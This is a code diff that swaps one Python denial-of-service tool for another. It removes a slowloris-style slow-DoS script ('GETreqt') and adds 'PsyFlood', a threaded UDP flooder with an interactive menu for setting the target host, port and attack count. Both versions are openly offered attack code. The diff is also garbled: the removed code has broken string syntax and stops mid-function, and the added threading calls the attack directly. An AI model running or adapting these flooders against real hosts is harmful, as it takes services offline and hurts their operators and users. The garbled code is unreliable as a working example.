@@ -1,119 +1,106 @@
 # -*- coding: utf-8 -*-        
 
-import socket; import time
-import threading; import random
-import argparse; import requests
-from termcolor import colored
-import colorama; import re
-import tqdm
+import os
+import socket
+import string
+import random
+import threading
+from colorama import Fore, Back, Style
 
-colorama.init()
+class SockFlood:
+	def __init__(self):
+		os.system("cls")
+		os.system("title PsyFlood - An Advance SERANGAN-UMUM ")
+		self.host=None
+		self.portnum=None
+		self.threads=None
 
-currentVersionNumber = "v3.2.0"
-BANNER1 = colored"""
- |:::::::::::|                                            / ::
+	def graphics(self):
+		banner="""
+
+:::::::::::|                                            / ::
  ———— ::————/    ___   ____    ____   ___   ____          | ::
     | ;:\ ::    / ::|/:::::\  /:::::\ | ::: | ::          | ::
     | :: \ :: :: :: / :: | ::/ :: | ::| :: :: ::  _____   | ::
     | ::  \ ::  ::  | :::::/ | :::::/ | :: \ :::  |_::::| | :::::::
      \__   \__/\__   \_____/  \_____/  |___  \___          \________
-||###################################################################||''', 'blue')
-||_________[[ BEIGADE ATTACKER SNIPER ELITE  ** By:Kun99 ]]__________||''', 'red')
+||###################################################################||
+||_________[[ BEIGADE ATTACKER SNIPER ELITE  ** By:Kun99 ]]__________||
 ||_________[[                                                        ||
-#####################################################################||''', 'blue')
+#####################################################################||
 """
-BANNER2 = colored('''    
-BANNER3 = colored('''    
-BANNER4 = colored('''    
 
+print(Fore.RED+banner)
+		print(Fore.YELLOW+"""
+		[+] An Advance DDOS Tool Using Sockets Written in Python [+]"""+Fore.GREEN+"""
+		[+] Developer : Kanao#7218 [ """+Fore.WHITE+"""SecretsX ]""")
+		print(Fore.WHITE+"""
+		[+] Type `help` If You Are A Beginner [+]
+			""")
 
-def printBanner():
-    print(BANNER1), print(BANNER2), print(BANNER3), print(BANNER4)
+	def start_attack(self,host,port=None):
+		self.sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+		try:
+			url_path=str(string.ascii_letters + string.digits + string.punctuation)
+			byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
+			if not port:
+				self.sock.sendto(byt,(host,80))
+			elif port:
+				self.sock.sendto(byt,(host,int(port)))
+			print(Fore.WHITE+"""[+] Sent Byte Successfully""")
+		except Exception as e:
+			print(Fore.RED+f"""
+	[-] Socket ERROR! Fatal X_X
+	[-] EXCEPTION : {e}
+						""")
 
+	def command_parser(self,command):
+		if command=="help":
+			print(Fore.WHITE+"""
+	Welcome To PsyFlood Help Menu - 
 
-def versionCheck():
-    global currentVersionNumber
+	(+) host %HOST% - Enter the Host Domain or Ip Address [!Required]
+	(+) port %PORT% - Enter a custom port if you have, or just don't use it will use port 80
+	(+) attacks %AMOUNT% - Enter a custom amount of attack, Default 1000
+	(+) start - Will start attacking and display outputs on console
+	""")
+		if "host " in command:
+			self.host=command.replace("host ","").replace("https://", "").replace("http://", "").replace("www.", "")
+			print(Fore.WHITE+f"""
+	[+] Successfully Set Host as {self.host}
+				""")
+		elif "port " in command:
+			self.portnum=command.replace("port ","")
+			print(Fore.WHITE+f"""
+	[+] Successfully Set Port to {self.portnum}
+				""")
+		elif command=="start":
+			print(self.portnum)
+			if self.host and self.portnum:
+				if int(self.threads):
+					for i in range(1,int(self.threads)):
+						threading.Thread(target=self.start_attack(self.host,self.portnum)).start()
+				else:
+					for i in range(1,1000):
+						threading.Thread(target=self.start_attack(self.host,self.portnum)).start()
+			elif self.host and not self.portnum:
+				if int(self.threads):
+					for i in range(1,int(self.threads)):
+						threading.Thread(target=self.start_attack(self.host)).start()
+				else:
+					for i in range(1,1000):
+						threading.Thread(target=self.start_attack(self.host)).start()
+		elif "attacks " in command:
+			self.threads=command.replace("attacks ","")
+			print(Fore.WHITE+f"""
+	[+] Successfully Set Threads to {self.threads}
+				""")
 
-    print("\nChecking for GETreqt updates...", end="")
+	def run(self):
+		self.graphics()
+		while True:
+			self.command_parser(input(Fore.CYAN+f"${os.environ.get('USERNAME')}$>> "))
 
-    crawlVersionFile = requests.get(VERSION_CHECK_URL)
-    crawlVersionFile = str(crawlVersionFile.content)
-    crawlVersionFile = re.findall(r"([0-9]+)", crawlVersionFile)
-    latestVersionNumber = int(''.join(crawlVersionFile))
-
-    currentVersionNumber = re.findall(r"([0-9]+)", currentVersionNumber)
-    currentVersionNumber = int(''.join(currentVersionNumber))
-
-    if currentVersionNumber >= latestVersionNumber:
-        print(colored(" You are using the latest version!\n", "green"))
-    elif currentVersionNumber < latestVersionNumber:
-        print(colored(" You are using an older version of GETreqt.", "red"))
-        print(colored("\nGet the latest version at https://github.com/SHUR1K-N/GETreqt-Multithreaded-Slow-DoS-Attack", "yellow"))
-        print(colored("Every new version comes with fixes, improvements, new features, etc..", "yellow"))
-        print(colored("Please do not open an Issue if you see this message and have not yet tried the latest version.\n", "yellow"))
-
-
-randomUserAgent = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Edg/87.0.664.57",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0",
-]
-successfulSends = 0
-
-
-def constructRequest():
-    requestHeaders = ["GET / HTTP/2.0",
-                      f"Host: {target}",
-                      # "Connection: keep-alive", # Not required with HTTP v1.1 & HTTP 2
-                      f"User-Agent: {random.choice(randomUserAgent)}\r\n",
-                      ]
-    if arguments.wait:
-        pass
-    elif arguments.end:
-        requestHeaders = requestHeaders[:3] + [f"User-Agent: {random.choice(randomUserAgent)}\r\n\r\n"]
-    GETrequest = "\r\n".join(requestHeaders).encode("utf-8")
-    return(GETrequest)
-
-
-def deployRequests(target, port, length, currentSocket, GETrequest):
-
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    # sock.settimeout(5)
-    try:
-        sock.connect((target, port))
-        sock.send(GETrequest)
-    except:
-        try:
-            sock.shutdown(socket.SHUT_RDWR)
-            sock.close()
-            deployRequests(target, port, length, currentSocket, GETrequest)
-        except:
-            deployRequests(target, port, length, currentSocket, GETrequest)
-
-    if arguments.end:
-        global successfulSends
-        for i in range(1, length + 1):
-            try:
-                sock.send(GETrequest)
-                successfulSends += 1
-                print(f"Successful send #{successfulSends} from socket {currentSocket}\n", end="")
-            except:
-                try:
-                    sock.shutdown(socket.SHUT_RDWR)
-                    sock.close()
-                    deployRequests(target, port, length, currentSocket, GETrequest)
-                except:
-                    deployRequests(target, port, length, currentSocket, GETrequest)
-            randomDelay = random.random() * 5
-            time.sleep(randomDelay)
-
-    else:
-        for i in range(1, length + 1):
-            try:
-                # sock.send(bytes(str(f"{random.randint(1, 5000)}\r\n"), encoding="utf-8"))
-                sock.send(b" ")
-                print(f"Sent \"don't you die on me\" packet {i} / {length} via socket {currentSocket}\n", end="")
-    
+if __name__=="__main__":
+	app=SockFlood()
+	app.run()
